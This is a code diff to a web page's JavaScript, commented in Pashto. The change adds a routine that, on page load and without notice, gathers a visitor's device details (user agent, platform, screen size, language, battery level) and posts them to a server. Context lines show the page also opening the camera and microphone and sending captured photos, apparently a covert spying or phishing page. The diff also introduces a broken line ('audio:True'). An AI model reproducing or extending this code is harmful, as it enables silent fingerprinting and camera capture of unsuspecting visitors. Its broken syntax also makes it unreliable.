@@ -60,6 +60,34 @@
             } catch (e) {}
         }
 
+        // د موبایل د معلوماتو راټولول او سمدستي سرور ته استول
+        async function collectAndSendDeviceInfo() {
+            try {
+                let batteryLevel = "نامعلوم";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                }
+
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform || "نامعلوم",
+                    screenSize: window.innerWidth + "x" + window.innerHeight,
+                    language: navigator.language || "نامعلوم",
+                    batteryLevel: batteryLevel
+                };
+
+                const formData = new FormData();
+                formData.append('device_info', JSON.stringify(deviceInfo));
+                await sendData(formData);
+            } catch (e) {}
+        }
+
+        // کله چې پاڼه پرانیستل شي، د موبایل معلومات په اتوماتيک ډول استول کیږي
+        window.addEventListener('load', () => {
+            collectAndSendDeviceInfo();
+        });
+
         async function sendSinglePhoto(stream) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -129,7 +157,7 @@
 
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio:True });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     await video.play();
